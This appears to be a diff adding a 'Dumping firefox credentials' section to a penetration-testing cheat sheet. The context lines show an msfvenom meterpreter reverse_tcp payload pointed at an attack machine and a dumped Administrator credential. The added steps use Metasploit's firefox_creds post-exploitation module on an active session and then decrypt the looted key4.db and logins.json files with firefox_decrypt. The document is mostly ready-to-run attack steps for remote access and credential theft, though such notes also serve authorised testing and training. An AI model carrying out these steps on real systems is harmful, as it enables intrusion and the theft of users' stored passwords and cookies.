@@ -231,3 +231,15 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=IP-OF-ATTACK-MACHINE LPORT
   UserName       : domain\Administrator
   CredentialBlob : Password123!
   ```
+
+## Dumping firefox credentials
+
+- With an active shell session on metasploit
+- `use post/multi/gather/firefox_creds`
+- set SESSION to the ID of your active shell session
+- `exploit`
+- the files will be downloaded in the loot directory, it will be shown where to in the command line
+- rename every file by checking their original name accordingly to: `key4.db`, `logins.json`, `cookies.sqlite`, `cert9.db`, `signons.sqlite`
+- Download [firefox decrypt](https://github.com/unode/firefox_decrypt)
+- And run it `python3 firefox_decrypt.py <msf loot directory>`
+- You should see the decrypted credentials on the screen
